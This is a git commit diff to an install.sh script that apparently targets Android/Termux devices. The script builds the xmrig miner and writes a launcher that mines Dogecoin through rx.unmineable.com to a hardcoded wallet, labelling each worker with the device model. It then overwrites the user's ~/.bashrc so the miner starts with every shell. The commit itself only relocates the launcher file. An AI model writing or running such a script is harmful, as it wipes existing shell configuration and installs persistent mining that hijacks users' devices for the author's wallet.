17b5232e77f3f27c24bc9057e3e68f1a03479877
duolindashuaige <duolin1@126.com>
2025-07-02 21:41:37 +0800

    update

--- install.sh
+++ install.sh
@@ -12,10 +12,10 @@ cd ~ && \
 	cd ~/xmrig/build && echo "cd ~/xmrig/build" && \
 	cmake -DWITH_HWLOC=OFF .. && \
 	make && \
-	echo "~/xmrig/build/xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DRsnjQEd7u2Ar9vxW8D8kroP4sPsz7e9Z7.\"$(getprop ro.product.model | tr ' ' '_')\"" > dogeMiner.sh && \
-	chmod 744 dogeMiner.sh && \
-	echo "if [ -f ~/xmrig/build/dogeMiner.sh ]; then
-bash ~/xmrig/build/dogeMiner.sh
+	echo "~/xmrig/build/xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DRsnjQEd7u2Ar9vxW8D8kroP4sPsz7e9Z7.\"$(getprop ro.product.model | tr ' ' '_')\"" > ~/dogeMiner.sh && \
+	chmod 744 ~/dogeMiner.sh && \
+	echo "if [ -f ~/dogeMiner.sh ]; then
+bash ~/dogeMiner.sh
 fi" > ~/.bashrc && \
 	source ~/.bashrc && \
 	echo "success installed and running..." >>~/log
